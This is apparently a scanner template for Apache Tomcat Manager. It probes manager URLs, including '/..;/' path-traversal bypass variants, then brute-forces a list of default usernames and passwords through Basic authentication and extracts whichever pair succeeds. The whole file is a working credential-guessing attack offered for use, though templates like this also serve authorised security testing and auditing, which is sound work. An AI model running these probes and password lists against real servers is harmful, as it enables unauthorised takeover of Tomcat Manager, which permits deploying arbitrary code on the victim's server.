id: tomcat-weak-login

info:
  name: Apahce Tomcat Manager Weak Login
  author: pdteam
  severity: high
  verified: true
  tags: tomcat,default-login
  created: 2023/06/24
  requires: [tomcat]

set:
  randstr: randomLowercase(6)
rules:
  r0:
    brute:
      mode: sniper
      commit: winner
      continue: false
      p:
        - /manager/html
        - /host-manager/html
        - "/..;/manager/html"
        - "/..;/host-manager/html"
        - "/..;/..;/manager/html;/"
        - "/..;/..;/host-manager/html;/"
        - "/{{randstr}}/..;/manager/html"
        - "/{{randstr}}/..;/host-manager/html"
    request:
      method: GET
      path: "{{p}}"
    expression: |
      (response.status == 401 || response.status == 403) &&
      response.raw_header.ibcontains(b'Manager Application')
  r1:
    brute:
      mode: clusterbomb
      commit: winner
      continue: false
      username:
        - admin
        - tomcat
        - manager
        - role1
        - both
      password:
        - admin
        - tomcat
        - manager
        - role1
        - both
        - s3cret
        - password
        - 123456
        - 12345678
        - 12345
        - 1234
        - 000000
        - admin123
        - admin@123
        - admin123456
        - tomcat123
        - tomcat@123
        - manager123
        - changeme
    request:
      method: GET
      path: "{{p}}"
      headers:
        Authorization: "Basic {{base64(username + ':' + password)}}"
      follow_redirects: true
    expression: response.status >= 200 && response.status < 400
    extractors:
      - name: username
        type: literal
        value: "{{username}}"
      - name: password
        type: literal
        value: "{{password}}"
expression: r0() && r1()
